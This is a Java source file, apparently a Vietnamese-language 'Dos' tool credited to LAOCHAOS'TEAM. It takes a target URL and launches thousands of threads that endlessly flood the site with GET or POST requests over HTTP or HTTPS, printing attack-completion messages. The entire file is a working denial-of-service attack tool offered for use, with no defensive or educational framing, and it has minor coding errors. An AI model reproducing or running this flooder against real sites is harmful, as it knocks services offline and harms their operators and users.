import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.ArrayList;

import javax.net.ssl.HttpsURLConnection;


public class Dos implements Runnable {



    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";

    private static int amount = 0;
    private static String url = "";
    int seq;
    int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Dos.url);
                        break;
                    case 2:
                        sslPostAttack(Dos.url);
                        break;
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;

                }
            }
        } catch (Exception e) {

        }
    }


    public static void main(String[] args) throws Exception {
        String url = "";
        int attakingAmoun = 0;
        Dos dos = new Dos(0, 0);
        Scanner in = new Scanner(System.in);
        System.out.print("Nhập Url: ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Bắt đầu tấn công vào url: " + url);

        String[] SUrl = url.split("://");

        System.out.println("Kiểm tra kết nối với Trang web");
        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        System.out.println("Author By: LAOCHAOS'TEAM");
        System.out.println("Phiên Bản: 1.0");

        System.out.print("Thread: ");
        String amount = in.nextLine();

        if (amount == null || amount.equals(null) || amount.equals("")) {
            Dos.amount = 2000;
        } else {
            Dos.amount = Integer.parseInt(amount);
        }

        System.out.print("method: ");
        String option = in.nextLine();
        int ioption = 1;
        if (option == "get" || option == "GET") {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 3;
            } else {
                ioption = 4;
            }
        } else {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 1;
            } else {
                ioption = 2;
            }
        }

        Thread.sleep(2000);


        System.out.println("Bắt đầu tấn công");
        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < Dos.amount; i++) {
            Thread t = new Thread(new Dos(i, ioption));
            t.start();
            threads.add(t);
        }

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {

            }
        }
        System.out.println("Chủ đề chính đã kết thúc");
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("Kiểm tra kết nối");
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("Đã kết nối với trang web");
        }
        Dos.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Kiểm tra kết nối (ssl)");
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("Đã kết nối với trang web");
   
        }
        Dos.url = url;
    }

    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "vi-VN,vi;");
        String urlParameters = "hết  bộ nhớ!";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Đã thực hiện xong cuộc tấn công POST!: " + responseCode + "Thread: " + this.seq);
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        System.out.println("Đã thực hiện xong cuộc tấn công GET!: " + responseCode + "Thread: " + this.seq);
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "vi-VN,vi;");
        String urlParameters = "hết bộ nhớ";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Đã thực hiện xong cuộc tấn công GET!:" + responseCode + "Thread: " + this.seq);
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        System.out.println("Đã thực hiện xong cuộc tấn công GET!: " + responseCode + "Thread: " + this.seq);
    }
}